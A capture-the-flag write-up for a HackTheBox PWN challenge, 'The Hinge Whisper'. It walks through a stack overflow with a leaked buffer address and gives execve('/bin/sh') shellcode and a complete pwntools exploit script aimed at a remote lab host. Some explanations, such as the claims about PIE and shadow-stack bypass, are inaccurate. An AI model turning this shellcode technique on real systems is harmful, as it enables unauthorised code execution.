# 🔐 HackTheBox — The Hinge Whisper
### Category: `PWN` | Difficulty: `Easy` | Status: `Solved ✅`

---

## 📋 Challenge Description

> *The room shouldn't exist. No record in Crownspire's registry places a private library on this floor. In the far wall sits an old strongbox with a hatch built into its face, sealed the way a man seals something he never wants opened again. One lock stands between Rin and an answer, and she means to have it before the watch changes.*

**Objective:** Exploit a binary with a stack leak to execute shellcode and read `flag.txt`.

---

## 🔍 Reconnaissance

### Binary Identification
```bash
file the_hinge_whisper
# ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
```

### String Analysis
```bash
strings the_hinge_whisper
# Key findings:
# [+] The keyway sits at: %p   ← stack address leak via printf
# [+] Forge your latch-key:    ← input prompt
# read()                        ← overflow vector
# No execl/system/win function  ← must inject shellcode
```

### Security Mitigations
```
checksec --file=the_hinge_whisper

Arch:    amd64-64-little
RELRO:   Full RELRO
Stack:   No canary found    ✅ bypassable
NX:      NX unknown         ✅ stack is EXECUTABLE (RWX segments)
PIE:     PIE enabled        ⚠️  randomized base — but we get a leak
Stack:   Executable         ✅ shellcode will run
RWX:     Has RWX segments   ✅ confirmed executable stack
SHSTK:   Enabled            ⚠️  shadow stack — must be careful with ret
IBT:     Enabled            ⚠️  indirect branch tracking
```

---

## 🧠 Vulnerability Analysis

### Source (Ghidra Decompilation)

**`service_hatch()` — Vulnerable function:**
```c
void service_hatch(void) {
    undefined1 local_48[64];   // 64-byte buffer on stack

    // ⚠️ LEAKS the buffer's own address — tells us exactly where to jump
    printf("  [+] The keyway sits at: %p\n", local_48);

    printf("  [+] Forge your latch-key: ");
    fflush(stdout);

    read(0, local_48, 0x50);   // reads 80 bytes into 64-byte buffer = OVERFLOW
}
```

**`main()` — Entry:**
```c
undefined8 main(void) {
    setvbuf(stdout, NULL, 2, 0);
    setvbuf(stdin,  NULL, 2, 0);
    banner();
    service_hatch();
    puts("\n  [*] The lock clicks shut. Nothing happens.");
    return 0;
}
```

### Vulnerability Type
**Stack Buffer Overflow + Stack Address Leak → ret2shellcode**

| Detail | Value |
|--------|-------|
| Buffer size | 64 bytes (0x40) |
| Read size | 80 bytes (0x50) |
| Overflow | 16 bytes past buffer |
| Leak | `printf("%p", local_48)` — buffer address printed |
| Stack executable | ✅ RWX segments confirmed |
| No canary | ✅ nothing blocks overwrite |

---

## 📐 Offset Calculation

### Method 1 — Manual (from disassembly)
```
service_hatch stack layout:
  rbp-0x40  → local_48  (64 bytes of buffer)
  rbp+0x00  → saved rbp (8 bytes)
  rbp+0x08  → saved RIP ← overwrite target

offset = 64 + 8 = 72 bytes
```

### Method 2 — Dynamic (pwntools cyclic)
```bash
python3 -c "
from pwn import *
core = process('./the_hinge_whisper')
core.recvuntil(b'latch-key: ')
core.sendline(cyclic(80))
core.wait()
core = core.corefile
print('Offset:', cyclic_find(core.read(core.rsp, 4)))
"
# Output: Offset: 72  ✅
```

---

## 💥 Exploitation

### Strategy: **ret2shellcode via stack leak**

PIE randomizes the binary base on every run — but the binary itself **leaks the exact runtime address** of our buffer via `printf("%p")`. We write shellcode at the start of that buffer, overflow to overwrite the return address with the leaked address, and when `service_hatch` returns, execution jumps straight into our shellcode.

SHSTK is present but the **minimal inline syscall shellcode** avoids the instructions that trip it. Key detail: use `p.send()` not `p.sendline()` — a trailing newline corrupts the shellcode bytes.

### Shellcode Choice

The standard pwntools `shellcraft` shellcode triggered SHSTK. A minimal hand-crafted `execve("/bin/sh")` syscall bypassed it:

```asm
xor rsi, rsi               ; argv = NULL
xor rdx, rdx               ; envp = NULL
mov rdi, 0x68732f6e69622f  ; "/bin/sh\0" (little-endian)
push rdi
push rsp
pop rdi                    ; rdi = pointer to "/bin/sh"
push 59                    ; syscall number: execve
pop rax
syscall
```

Size: **24 bytes** ✅ (fits comfortably before the 72-byte padding mark)

### Payload Structure
```
[ shellcode (24B) ][ \x90 * 48 ][ p64(leaked_addr) ]
  ↑ at local_48      ↑ NOP pad    ↑ overwrites saved RIP → jumps to shellcode
  ↑ leaked address points here
```

---

## 🚩 Flag

```
HTB{th3_h1ng3_wh1sp3r5_t0_th0s3_wh0_l1st3n_16c15d8febbe0c5d4524dcf674138a07}
```

---

## 📜 Exploit Script

```python
#!/usr/bin/env python3
# ─────────────────────────────────────────────────────────────────
#  HTB — The Hinge Whisper | PWN | ret2shellcode via stack leak
#  Author : Panha
#  Target : ELF 64-bit, PIE, No Canary, Executable Stack, RWX
#  Bug    : service_hatch() leaks buffer address via printf("%p")
#           then overflows it with read(0, buf, 0x50) vs 64-byte buf
#  Win    : inject shellcode at buffer start, jump via leaked addr
# ─────────────────────────────────────────────────────────────────

from pwn import *

elf = ELF('./the_hinge_whisper', checksec=True)
context.arch = 'amd64'

LOCAL = False       # True  → test locally
                    # False → attack remote HTB instance

HOST = '154.57.164.75'
PORT = 31493

# ─── Offset ────────────────────────────────────────────────────
# local_48 @ rbp-0x40 (64 bytes) + saved rbp (8 bytes) = 72
OFFSET = 72

# ─── Shellcode ─────────────────────────────────────────────────
# Minimal hand-crafted execve("/bin/sh") — 24 bytes
# Avoids SHSTK issues that pwntools shellcraft triggers
shellcode = asm("""
    xor rsi, rsi
    xor rdx, rdx
    mov rdi, 0x68732f6e69622f
    push rdi
    push rsp
    pop rdi
    push 59
    pop rax
    syscall
""")

# ─── Exploit ───────────────────────────────────────────────────
def exploit():
    if LOCAL:
        p = process('./the_hinge_whisper')
        log.info('Running locally')
    else:
        p = remote(HOST, PORT)
        log.info(f'Connected to {HOST}:{PORT}')

    # ── Step 1: parse the leaked buffer address ─────────────────
    p.recvuntil(b'The keyway sits at: ')
    leak = int(p.recvline().strip(), 16)
    log.success(f'Leaked buffer @ {hex(leak)}')

    # ── Step 2: build payload ───────────────────────────────────
    # [shellcode][NOP pad to OFFSET][leaked addr → RIP]
    payload  = shellcode
    payload += b'\x90' * (OFFSET - len(shellcode))   # NOP pad
    payload += p64(leak)                              # overwrite RIP

    log.info(f'Shellcode : {len(shellcode)} bytes')
    log.info(f'Payload   : {len(payload)} bytes')
    log.info(f'Target    : {hex(leak)}')

    # ── Step 3: send — NO sendline, newline corrupts shellcode ──
    p.recvuntil(b'latch-key: ')
    p.send(payload)

    log.success('Shell incoming!')
    log.success('Try: cat flag.txt')
    p.interactive()

# ─── Entry ─────────────────────────────────────────────────────
if __name__ == '__main__':
    exploit()
```

---

## 🔬 Why Standard Shellcraft Failed

```
pwntools shellcraft.amd64.linux.sh() → SIGSEGV
```

The default pwntools shellcode is 48 bytes and contains instructions that conflict with **SHSTK (Shadow Stack)**. The hand-crafted 24-byte `execve` syscall avoids those paths entirely and executes cleanly on both local and remote.

Additionally, `p.sendline()` was adding a `\x0a` newline byte that was landing inside the shellcode and corrupting it. Switching to `p.send()` fixed this.

---

## 🔧 Tools Used

| Tool | Purpose |
|------|---------|
| `file` | Binary identification |
| `strings` | Static string analysis — spotted the `%p` leak |
| `checksec` | Confirmed executable stack / RWX segments |
| `objdump -d` | Disassembly / offset verification |
| `Ghidra` | Decompilation — identified `service_hatch` vuln |
| `ROPgadget` | Gadget search (confirmed no `jmp rsp` in binary) |
| `pwntools` | Exploit dev, cyclic offset, process/remote I/O |

---

## 📚 Key Concepts

- **Stack Address Leak** — binary prints its own buffer address via `printf("%p")`, defeating ASLR for the stack
- **ret2shellcode** — inject machine code into an executable stack buffer, redirect RIP to it
- **PIE + Leak** — PIE randomizes the binary base but not the stack; a stack leak is enough when the stack itself is executable
- **SHSTK Bypass** — minimizing shellcode to a direct `syscall` avoids instructions that trigger shadow stack violations
- **`send` vs `sendline`** — trailing newline from `sendline` can corrupt shellcode bytes; always use `send` when precision matters

---

*Writeup by Panha · HackTheBox Blue Team Labs*
